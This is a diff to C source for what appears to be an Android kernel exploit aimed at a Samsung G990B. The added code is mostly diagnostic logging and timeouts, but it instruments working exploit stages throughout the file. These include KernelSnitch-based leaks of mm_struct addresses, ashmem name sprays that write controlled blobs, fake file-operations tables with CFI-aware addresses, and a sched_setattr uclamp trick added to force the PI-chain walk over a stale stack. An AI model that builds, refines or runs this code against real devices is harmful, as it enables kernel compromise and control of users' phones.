@@ -1,6 +1,125 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 
+#if defined(RMG_DIAG_COW_SEND_TRACE) && RMG_DIAG_COW_SEND_TRACE
+#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE
+#error "COW send tracing requires COW_TRACE"
+#endif
+#if (!defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY) && \
+    (!defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
+     !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+     !RMG_DIAG_UCLAMP_TRIGGER_ONLY)
+#error "COW send tracing requires COW_ONLY or guarded PI/uclamp probe"
+#endif
+#endif
+
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+#if defined(RMG_DIAG_LOAD_ONLY) && RMG_DIAG_LOAD_ONLY
+#define RMG_DIAG_CHECKPOINT_PATH \
+  "/data/local/tmp/rmg-load-only-r9q-G990B-20261125.log"
+#else
+#define RMG_DIAG_CHECKPOINT_PATH \
+  "/data/local/tmp/rmg-pipe-oracle-checkpoint.log"
+#endif
+static atomic_int rmg_diag_checkpoint_deferred;
+
+static int rmg_diag_checkpoint_write(int truncate_file, const char *stage,
+                                     unsigned long long value1,
+                                     unsigned long long value2,
+                                     const char *text) {
+  int flags = O_WRONLY | O_CREAT | O_CLOEXEC | (truncate_file ? O_TRUNC : O_APPEND);
+  int fd = open(RMG_DIAG_CHECKPOINT_PATH, flags, 0666);
+  if (fd < 0)
+    return -1;
+
+  struct timespec ts = {0};
+  clock_gettime(CLOCK_MONOTONIC, &ts);
+  char line[512];
+  int len;
+  if (text && *text) {
+    char safe_text[256];
+    size_t i = 0;
+    for (; text[i] && i + 1 < sizeof(safe_text); i++) {
+      char c = text[i];
+      int allowed = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+                    (c >= '0' && c <= '9') || c == '_' || c == '-' ||
+                    c == '.' || c == ',' || c == '=' || c == ':' ||
+                    c == '/';
+      safe_text[i] = allowed ? c : '_';
+    }
+    safe_text[i] = '\0';
+    len = snprintf(line, sizeof(line),
+                   "%lld.%03ld stage=%s a=%llu b=%llu text=%s\n",
+                   (long long)ts.tv_sec, ts.tv_nsec / 1000000, stage,
+                   value1, value2, safe_text);
+  } else {
+    len = snprintf(line, sizeof(line),
+                   "%lld.%03ld stage=%s a=%llu b=%llu\n",
+                   (long long)ts.tv_sec, ts.tv_nsec / 1000000, stage,
+                   value1, value2);
+  }
+  int result = -1;
+  if (len > 0 && (size_t)len < sizeof(line)) {
+    size_t written = 0;
+    while (written < (size_t)len) {
+      ssize_t n = write(fd, line + written, (size_t)len - written);
+      if (n < 0 && errno == EINTR)
+        continue;
+      if (n <= 0)
+        goto out;
+      written += (size_t)n;
+    }
+    result = fdatasync(fd);
+  }
+out:
+  close(fd);
+  return result;
+}
+
+void rmg_diag_checkpoint_reset(void) {
+  atomic_store_explicit(&rmg_diag_checkpoint_deferred, 0,
+                        memory_order_release);
+  if (rmg_diag_checkpoint_write(1, "run-start", 0, 0, NULL) != 0) {
+    int saved_errno = errno;
+    fprintf(stderr, "durable checkpoint write failed stage=run-start errno=%d\n",
+            saved_errno);
+    fflush(stderr);
+  }
+}
+
+void rmg_diag_checkpoint_defer(int defer) {
+  atomic_store_explicit(&rmg_diag_checkpoint_deferred, defer != 0,
+                        memory_order_release);
+}
+
+void rmg_diag_checkpoint(const char *stage, unsigned long long value1,
+                         unsigned long long value2) {
+  if (atomic_load_explicit(&rmg_diag_checkpoint_deferred,
+                           memory_order_acquire))
+    return;
+  if (rmg_diag_checkpoint_write(0, stage, value1, value2, NULL) != 0) {
+    int saved_errno = errno;
+    fprintf(stderr, "durable checkpoint write failed stage=%s errno=%d\n",
+            stage, saved_errno);
+    fflush(stderr);
+  }
+}
+
+void rmg_diag_checkpoint_text(const char *stage, unsigned long long value1,
+                              unsigned long long value2, const char *text) {
+  if (atomic_load_explicit(&rmg_diag_checkpoint_deferred,
+                           memory_order_acquire))
+    return;
+  if (rmg_diag_checkpoint_write(0, stage, value1, value2, text) != 0) {
+    int saved_errno = errno;
+    fprintf(stderr,
+            "durable checkpoint write failed stage=%s errno=%d\n",
+            stage, saved_errno);
+    fflush(stderr);
+  }
+}
+#endif
+
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
@@ -10,6 +129,18 @@ static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+static int mm_diag_active;
+static int mm_diag_attempt;
+static int mm_diag_pass;
+
+static uint64_t mm_diag_now_ms(void) {
+  struct timespec ts;
+  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
+    return 0;
+  return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
+}
+#endif
 
 static int controlled_uring_prewarm(void);
 static void controlled_uring_finish_prewarm(void);
@@ -320,10 +451,12 @@ long sched_setattr_tid(int tid, int nice_value) {
 }
 
 long sched_setattr_tid_nochange(int tid) {
-  /* Re-apply the target's CURRENT policy/nice/flags/uclamp: a scheduler
-   * no-op that still runs the full __sched_setscheduler path - including
-   * the rt_mutex_adjust_pi pi-chain walk at its tail (gated only by the
-   * pi argument, not by the attr values).
+  /* Re-apply the target's CURRENT policy/nice/flags/uclamp to avoid a class
+   * or nice change that can reschedule a task on another CPU and overwrite
+   * the stale stack. On this kernel, however, unchanged policy/nice with no
+   * util-clamp flag takes __sched_setscheduler()'s early return before
+   * rt_mutex_adjust_pi(). A successful call here is not evidence that the
+   * PI-chain walk ran; callers must verify the route's rb-tree canary.
    *
    * A class or nice CHANGE on a task that is RUNNING on another CPU forces
    * resched_curr -> a resched IPI to that CPU. The target then takes the
@@ -335,11 +468,83 @@ long sched_setattr_tid_nochange(int tid) {
   struct local_sched_attr attr;
   memset(&attr, 0, sizeof(attr));
   attr.size = sizeof(attr);
-  if (syscall(SYS_sched_getattr, tid, &attr, sizeof(attr), 0) != 0) {
+  errno = 0;
+  long get_ret = syscall(SYS_sched_getattr, tid, &attr, sizeof(attr), 0);
+  int get_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("sched-nochange-getattr", (unsigned long long)get_ret,
+                      (unsigned long long)get_errno);
+#endif
+  if (get_ret != 0) {
+    errno = get_errno;
     return -1;
   }
   attr.size = sizeof(attr);
-  return syscall(SYS_sched_setattr, tid, &attr, 0);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("sched-nochange-setattr-enter", tid,
+                      (unsigned long long)attr.sched_policy);
+#endif
+  errno = 0;
+  long set_ret = syscall(SYS_sched_setattr, tid, &attr, 0);
+  int set_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("sched-nochange-setattr-return",
+                      (unsigned long long)set_ret,
+                      (unsigned long long)set_errno);
+#endif
+  errno = set_errno;
+  return set_ret;
+}
+
+long sched_setattr_tid_uclamp_nochange(int tid) {
+  /* Keep policy, nice, and requested clamp values unchanged, but include the
+   * UTIL_CLAMP flags so the G990B kernel does not take its unchanged-policy
+   * early return before rt_mutex_adjust_pi(). This diagnostic still enters
+   * the scheduler's dequeue/re-enqueue path and marks the clamp requests as
+   * user-defined; it is deliberately isolated behind a compile-time guard. */
+  const uint64_t sched_flag_util_clamp_min = 1ULL << 5;
+  const uint64_t sched_flag_util_clamp_max = 1ULL << 6;
+  const uint32_t sched_capacity_scale = 1024;
+  struct local_sched_attr attr;
+  memset(&attr, 0, sizeof(attr));
+  attr.size = sizeof(attr);
+  errno = 0;
+  long get_ret = syscall(SYS_sched_getattr, tid, &attr, sizeof(attr), 0);
+  int get_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("sched-uclamp-getattr", (unsigned long long)get_ret,
+                      (unsigned long long)get_errno);
+  rmg_diag_checkpoint("sched-uclamp-current", attr.sched_util_min,
+                      attr.sched_util_max);
+#endif
+  if (get_ret != 0) {
+    errno = get_errno;
+    return -1;
+  }
+  if (attr.sched_util_min > attr.sched_util_max ||
+      attr.sched_util_max > sched_capacity_scale) {
+    errno = EINVAL;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("sched-uclamp-values-invalid",
+                        attr.sched_util_min, attr.sched_util_max);
+#endif
+    return -1;
+  }
+  attr.size = sizeof(attr);
+  attr.sched_flags |= sched_flag_util_clamp_min | sched_flag_util_clamp_max;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("sched-uclamp-setattr-enter", tid, attr.sched_flags);
+#endif
+  errno = 0;
+  long set_ret = syscall(SYS_sched_setattr, tid, &attr, 0);
+  int set_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("sched-uclamp-setattr-return",
+                      (unsigned long long)set_ret,
+                      (unsigned long long)set_errno);
+#endif
+  errno = set_errno;
+  return set_ret;
 }
 
 int try_cache_ashmem_path(const char *path) {
@@ -474,7 +679,33 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO_CFI));
 }
 
-int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
+static int try_set_ashmem_name_ioctl(int fd, const char *name,
+                                     int trace, int phase, size_t pos) {
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  if (trace)
+    rmg_diag_checkpoint("cfi-setname-enter", phase, pos);
+#else
+  (void)trace;
+  (void)phase;
+  (void)pos;
+#endif
+  errno = 0;
+  int ret = ioctl(fd, ASHMEM_SET_NAME, name);
+  int saved_errno = errno;
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  if (trace)
+    rmg_diag_checkpoint("cfi-setname-return",
+                        (unsigned long long)(long long)ret, saved_errno);
+#endif
+  errno = saved_errno;
+  return ret;
+}
+
+static int try_put_blob_no_zeros_internal(int fd,
+                                          const unsigned char *blob,
+                                          size_t len, int trace) {
   char name[ASHMEM_NAME_LEN];
   memset(name, 0x41, sizeof(name));
 
@@ -482,10 +713,16 @@ int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
     name[i] = blob[i] ? blob[i] : 1;
   }
   name[len] = 0;
-  return ioctl(fd, ASHMEM_SET_NAME, name);
+  return try_set_ashmem_name_ioctl(fd, name, trace, 0, len);
 }
 
-int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
+int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
+  return try_put_blob_no_zeros_internal(fd, blob, len, 0);
+}
+
+static int try_put_blob_zero_at_internal(int fd,
+                                         const unsigned char *blob,
+                                         size_t pos, int trace) {
   char name[ASHMEM_NAME_LEN];
   memset(name, 0x41, sizeof(name));
 
@@ -493,21 +730,31 @@ int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
     name[i] = blob[i] ? blob[i] : 1;
   }
   name[pos] = 0;
-  return ioctl(fd, ASHMEM_SET_NAME, name);
+  return try_set_ashmem_name_ioctl(fd, name, trace, 1, pos);
 }
 
-int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
-  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
+int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
+  return try_put_blob_zero_at_internal(fd, blob, pos, 0);
+}
+
+static int try_set_ashmem_name_blob_internal(int fd,
+                                             const unsigned char *blob,
+                                             size_t len, int trace) {
+  if (try_put_blob_no_zeros_internal(fd, blob, len, trace) != 0) {
     return -1;
   }
 
   for (size_t i = len; i > 0; i--) {
     if (blob[i - 1] == 0 &&
-        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
+        try_put_blob_zero_at_internal(fd, blob, i - 1, trace) != 0) {
       return -1;
     }
   }
   return 0;
+}
+
+int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
+  return try_set_ashmem_name_blob_internal(fd, blob, len, 0);
 }
 
 pid_t clone_child(void) {
@@ -532,7 +779,20 @@ pid_t clone_leak_child(void) {
     if (getppid() == 1) {
       _exit(1);
     }
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t started = mm_diag_now_ms();
+    if (mm_diag_active)
+      pr_info("mmcollect child start attempt=%d pass=%d pid=%d cpu=%d\n",
+              mm_diag_attempt, mm_diag_pass, getpid(), sched_getcpu());
+#endif
     kernelsnitch_find_collisions(ks);
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    if (mm_diag_active)
+      pr_info("mmcollect child done attempt=%d pass=%d pid=%d cpu=%d elapsed_ms=%llu state=%d\n",
+              mm_diag_attempt, mm_diag_pass, getpid(),
+              sched_getcpu(),
+              (unsigned long long)(mm_diag_now_ms() - started), ks->state);
+#endif
     exit(0);
   }
   return child;
@@ -933,7 +1193,7 @@ static uintptr_t controlled_match_mm_page(
  * page hint, only the 34 candidates in that slab are tested; if the new mm
  * landed elsewhere, retry once with the full KernelSnitch scan. */
 static int controlled_leak_mm(int cpu_count, uintptr_t hint,
-                              uintptr_t *mm_out) {
+                              uintptr_t *mm_out, int scan_attempt) {
   uintptr_t current_hint = hint;
   for (int pass = 0; pass < (hint ? 2 : 1); pass++) {
     /* Two-address hint matching has a ~34/4096 false-hit chance per
@@ -942,20 +1202,147 @@ static int controlled_leak_mm(int cpu_count, uintptr_t hint,
      * the target slab pinned. Keep all four collision constraints even for
      * hinted page-only matching. */
     size_t collisions = KSNITCH_COLLISIONS;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-pass-start", scan_attempt, pass);
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t setup_started = mm_diag_now_ms();
+    mm_diag_active = 1;
+    mm_diag_attempt = scan_attempt;
+    mm_diag_pass = pass;
+    pr_info("mmcollect stage=setup-start attempt=%d pass=%d hinted=%d\n",
+            scan_attempt, pass, current_hint != 0);
+#endif
     ks = kernelsnitch_setup(
         MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    ks->diagnostic_attempt = scan_attempt;
+#endif
     kernelsnitch_set_profile(ks, 512, 64, 8);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-setup-done", scan_attempt, pass);
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    pr_info("mmcollect stage=setup-done attempt=%d pass=%d elapsed_ms=%llu\n",
+            scan_attempt, pass,
+            (unsigned long long)(mm_diag_now_ms() - setup_started));
+#endif
 
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t child_started = mm_diag_now_ms();
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-child-create", scan_attempt, pass);
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    cpu_set_t allowed_cpus;
+    CPU_ZERO(&allowed_cpus);
+    int affinity_ok = sched_getaffinity(0, sizeof(allowed_cpus),
+                                        &allowed_cpus) == 0;
+    unsigned long long affinity_mask = 0;
+    int allowed_count = 0;
+    if (affinity_ok) {
+      for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
+        if (!CPU_ISSET(cpu, &allowed_cpus))
+          continue;
+        allowed_count++;
+        if (cpu < 64)
+          affinity_mask |= 1ULL << cpu;
+      }
+    }
+    pr_info("mmcollect fork-enter attempt=%d pass=%d parent_cpu=%d affinity_ok=%d allowed_count=%d mask=%016llx\n",
+            scan_attempt, pass, sched_getcpu(), affinity_ok, allowed_count,
+            affinity_mask);
+#endif
     pid_t child = clone_leak_child();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-child-created", child, scan_attempt);
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    pr_info("mmcollect stage=child-created attempt=%d pass=%d pid=%d elapsed_ms=%llu\n",
+            scan_attempt, pass, child,
+            (unsigned long long)(mm_diag_now_ms() - child_started));
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t memfd_started = mm_diag_now_ms();
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-memfd-open", scan_attempt, pass);
+#endif
     int fd = open_memfd(child);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-memfd-ready", fd, scan_attempt);
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    pr_info("mmcollect stage=memfd-open attempt=%d pass=%d pid=%d fd=%d elapsed_ms=%llu\n",
+            scan_attempt, pass, child, fd,
+            (unsigned long long)(mm_diag_now_ms() - memfd_started));
+#endif
     int status = 0;
     pid_t waited;
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t wait_started = mm_diag_now_ms();
+    uint64_t heartbeat_at = 15000;
+    int child_timed_out = 0;
+    for (;;) {
+      waited = waitpid(child, &status, WNOHANG);
+      if (waited == child || (waited < 0 && errno != EINTR))
+        break;
+      uint64_t elapsed = mm_diag_now_ms() - wait_started;
+      if (elapsed >= heartbeat_at) {
+        pr_info("mmcollect stage=child-wait attempt=%d pass=%d pid=%d elapsed_ms=%llu state=%d\n",
+                scan_attempt, pass, child, (unsigned long long)elapsed,
+                ks->state);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+        rmg_diag_checkpoint("mmcollect-child-wait", scan_attempt, elapsed);
+#endif
+        heartbeat_at += 15000;
+      }
+      if (elapsed >= RMG_DIAG_MM_CHILD_TIMEOUT_MS) {
+        child_timed_out = 1;
+        break;
+      }
+      usleep(100000);
+    }
+#else
     do {
       waited = waitpid(child, &status, 0);
     } while (waited < 0 && errno == EINTR);
+#endif
+
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    if (child_timed_out) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("mmcollect-child-timeout", scan_attempt,
+                          mm_diag_now_ms() - wait_started);
+#endif
+      pr_warning("mmcollect stage=child-timeout attempt=%d pass=%d pid=%d elapsed_ms=%llu\n",
+                 scan_attempt, pass, child,
+                 (unsigned long long)(mm_diag_now_ms() - wait_started));
+      kill(child, SIGKILL);
+      while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {}
+      close(fd);
+      ks->state = KERNELSNITCH_MM_NOT_FOUND;
+      kernelsnitch_cleanup(ks);
+      ks = NULL;
+      mm_diag_active = 0;
+      return -2;
+    }
+    pr_info("mmcollect stage=child-reaped attempt=%d pass=%d pid=%d wait=%d status=%d elapsed_ms=%llu collisions=%d\n",
+            scan_attempt, pass, child, waited, status,
+            (unsigned long long)(mm_diag_now_ms() - wait_started),
+            ks->state == KERNELSNITCH_COLLISIONS_FOUND);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-child-reaped", scan_attempt, status);
+#endif
+#endif
 
     if (waited != child || !WIFEXITED(status) || WEXITSTATUS(status) ||
         !kernelsnitch_found_collisions(ks)) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_warning("mmcollect stage=collision-failed attempt=%d pass=%d wait=%d status=%d errno=%d\n",
+                 scan_attempt, pass, waited, status, errno);
+#endif
       close(fd);
       ks->state = KERNELSNITCH_MM_NOT_FOUND;
       kernelsnitch_cleanup(ks);
@@ -968,17 +1355,45 @@ static int controlled_leak_mm(int cpu_count, uintptr_t hint,
     }
 
     if (current_hint) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      uint64_t match_started = mm_diag_now_ms();
+#endif
       ks->mm_struct = controlled_match_mm_page(ks, current_hint);
       ks->found = ks->mm_struct != (uintptr_t)-1;
       ks->state = ks->found ? KERNELSNITCH_MM_FOUND
                             : KERNELSNITCH_MM_NOT_FOUND;
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_info("mmcollect stage=hint-match attempt=%d pass=%d found=%d elapsed_ms=%llu\n",
+              scan_attempt, pass, (int)ks->found,
+              (unsigned long long)(mm_diag_now_ms() - match_started));
+#endif
     } else {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      uint64_t brute_started = mm_diag_now_ms();
+      pr_info("mmcollect stage=bruteforce-start attempt=%d pass=%d\n",
+              scan_attempt, pass);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("mmcollect-bruteforce-start", scan_attempt, pass);
+#endif
       kernelsnitch_bruteforce(ks);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("mmcollect-bruteforce-done", scan_attempt, pass);
+#endif
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_info("mmcollect stage=bruteforce-done attempt=%d pass=%d elapsed_ms=%llu found=%d\n",
+              scan_attempt, pass,
+              (unsigned long long)(mm_diag_now_ms() - brute_started),
+              ks->mm_struct != (uintptr_t)-1);
+#endif
     }
 
     uintptr_t mm = ks->mm_struct;
     kernelsnitch_cleanup(ks);
     ks = NULL;
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    mm_diag_active = 0;
+#endif
     if (mm != (uintptr_t)-1) {
       *mm_out = mm;
       return fd;
@@ -1030,20 +1445,66 @@ static int controlled_collect_mm_slab(
   size_t guard_group = CONTROLLED_RECLAIM_GROUPS;
   uintptr_t hint = 0;
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+  uint64_t scan_started = mm_diag_now_ms();
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-scan-start", 0, 0);
+#endif
 
   pin_to_core(0);
   for (int attempt = 1;
        attempt <= CONTROLLED_RECLAIM_SCAN_MAX &&
        selected == CONTROLLED_RECLAIM_GROUPS;
        attempt++) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t scan_elapsed = mm_diag_now_ms() - scan_started;
+    if (scan_elapsed >= RMG_DIAG_MM_SCAN_TIMEOUT_MS) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("mmcollect-scan-timeout", scan_elapsed, attempt);
+#endif
+      pr_warning("mmcollect stage=scan-timeout elapsed_ms=%llu attempt=%d groups=%zu\n",
+                 (unsigned long long)scan_elapsed, attempt, group_count);
+      break;
+    }
+#endif
     uintptr_t mm = 0;
-    int fd = controlled_leak_mm(cpu_count, hint, &mm);
-    if (fd < 0)
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    uint64_t leak_started = mm_diag_now_ms();
+    pr_info("mmcollect stage=leak-start attempt=%d hinted=%d groups=%zu\n",
+            attempt, hint != 0, group_count);
+#endif
+    int fd = controlled_leak_mm(cpu_count, hint, &mm, attempt);
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    pr_info("mmcollect stage=leak-done attempt=%d fd=%d elapsed_ms=%llu\n",
+            attempt, fd,
+            (unsigned long long)(mm_diag_now_ms() - leak_started));
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if (attempt == 1 || attempt % 8 == 0 || fd >= 0)
+      rmg_diag_checkpoint(fd >= 0 ? "mmcollect-leak" : "mmcollect-scan",
+                          attempt, group_count);
+#endif
+    if (fd == -2) {
+      pr_warning("controlled mm collection stopped after diagnostic child timeout attempt=%d\n",
+                 attempt);
+      break;
+    }
+    if (fd < 0) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_info("mmcollect stage=leak-miss attempt=%d hint=%d\n",
+              attempt, hint != 0);
+#endif
       continue;
+    }
 
     uintptr_t base = mm & ~(ORDER3_SIZE - 1);
     size_t slot = (mm - base) / MM_STRUCT_SZ;
     if (slot >= batch || base < DIRECT_MAP_BASE || base >= DIRECT_MAP_END) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_warning("mmcollect candidate-rejected attempt=%d mm=%016zx base=%016zx slot=%zu batch=%zu cpu=%d\n",
+                 attempt, mm, base, slot, batch, sched_getcpu());
+#endif
       close(fd);
       hint = 0;
       continue;
@@ -1060,8 +1521,21 @@ static int controlled_collect_mm_slab(
         group_count < CONTROLLED_RECLAIM_GROUPS) {
       group = group_count++;
       bases[group] = base;
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_info("mmcollect page-new attempt=%d group=%zu base=%016zx hint=%016zx cpu=%d\n",
+              attempt, group, base, hint, sched_getcpu());
+#endif
+    } else if (group != CONTROLLED_RECLAIM_GROUPS) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_info("mmcollect page-reuse attempt=%d group=%zu base=%016zx hint=%016zx cpu=%d\n",
+              attempt, group, base, hint, sched_getcpu());
+#endif
     }
     if (group == CONTROLLED_RECLAIM_GROUPS) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_warning("mmcollect page-limit attempt=%d base=%016zx groups=%zu cpu=%d\n",
+                 attempt, base, group_count, sched_getcpu());
+#endif
       close(fd);
       hint = 0;
       continue;
@@ -1069,6 +1543,11 @@ static int controlled_collect_mm_slab(
 
     size_t index = group * batch + slot;
     if (seen[index]) {
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+      pr_info("mmcollect slot-duplicate attempt=%d group=%zu mm=%016zx base=%016zx slot=%zu count=%zu/%zu cpu=%d\n",
+              attempt, group, mm, base, slot, counts[group], batch,
+              sched_getcpu());
+#endif
       if (opaque_count < CONTROLLED_RECLAIM_SCAN_MAX)
         opaque[opaque_count++] = fd;
       else
@@ -1080,6 +1559,20 @@ static int controlled_collect_mm_slab(
     seen[index] = 1;
     fds[index] = fd;
     counts[group]++;
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    pr_info("mmcollect slot-new attempt=%d group=%zu mm=%016zx base=%016zx slot=%zu count=%zu/%zu hint=%016zx cpu=%d\n",
+            attempt, group, mm, base, slot, counts[group], batch, hint,
+            sched_getcpu());
+    struct mm_slabinfo scan_info = {0};
+    int scan_info_ok = read_mm_slabinfo(&scan_info);
+    pr_info("mmcollect cache stage=after-candidate attempt=%d ok=%d active=%lu objects=%lu candidate_count=%zu base=%016zx slot=%zu\n",
+            attempt, scan_info_ok, scan_info.active_objs, scan_info.num_objs,
+            counts[group], base, slot);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-cache-candidate", attempt,
+                        scan_info.active_objs);
+#endif
+#endif
     hint = counts[group] < batch ? base : 0;
     if (counts[group] == 1 || counts[group] % 8 == 0 ||
         counts[group] == batch) {
@@ -1124,6 +1617,10 @@ static int controlled_collect_mm_slab(
   free(opaque);
   free(seen);
   free(fds);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-scan-end", group_count,
+                      selected != CONTROLLED_RECLAIM_GROUPS);
+#endif
   return selected != CONTROLLED_RECLAIM_GROUPS;
 }
 
@@ -1172,18 +1669,88 @@ int collect_controlled_mm_slab_page(
       base_out, target_fds, buddy_guard_fd_out, buddy_base_out);
 }
 
+#if RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+int run_mm_collection_diagnostic(void) {
+  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
+  int target_fds[ORDER3_SIZE / MM_STRUCT_SZ];
+  uintptr_t base = 0;
+  uintptr_t buddy_base = 0;
+  int buddy_guard_fd = -1;
+  uint64_t started = mm_diag_now_ms();
+  struct mm_slabinfo slab_before = {0};
+  int slab_before_ok = read_mm_slabinfo(&slab_before);
+  pr_info("mmcollect cache stage=before-seed ok=%d active=%lu objects=%lu object_size=%lu objs_per_slab=%lu pages_per_slab=%lu active_slabs=%lu slabs=%lu\n",
+          slab_before_ok, slab_before.active_objs, slab_before.num_objs,
+          slab_before.object_size, slab_before.objects_per_slab,
+          slab_before.pages_per_slab, slab_before.active_slabs,
+          slab_before.num_slabs);
